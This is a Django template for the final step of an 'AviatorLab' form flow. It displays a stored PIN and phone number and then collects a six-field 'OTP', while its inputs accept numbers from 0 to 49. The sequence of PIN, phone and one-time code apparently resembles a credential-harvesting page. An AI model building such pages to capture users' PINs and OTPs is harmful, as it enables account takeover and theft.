{% extends "base.html" %}
{% block title %}OTP — AviatorLab{% endblock %}
{% block content %}
<div class="progress">
  <span class="done"></span><span class="done"></span><span class="done"></span><span class="active"></span>
</div>
<section class="narrow panel">
  <div class="eyebrow">Enter OTP</div>
  <h1 class="page-title">Enter your <span>OTP.</span></h1>
  <div class="summary"><span>PIN</span><b>{{ session.four_numbers }}</b></div>
  <div class="summary" style="margin-top:0.5rem"><span>Phone</span><b>{{ session.phone_number }}</b></div>

  <form method="post" action="{% url 'save_six_numbers' %}" id="numberForm">
    {% csrf_token %}
    <div class="number-grid six">
      {% for n in "123456" %}
      <label class="number-field">
        <span>{{ forloop.counter }}</span>
        <input
          name="numbers"
          type="text"
          inputmode="numeric"
          pattern="[0-9]*"
          min="0"
          max="49"
          maxlength="2"
          required
          autocomplete="off"
          title="Enter a number from 0 to 49"
        >
      </label>
      {% endfor %}
    </div>
    <p class="helper">Enter otp.</p>
    <button class="btn primary full">Proceed <span>→</span></button>
  </form>
</section>
{% endblock %}
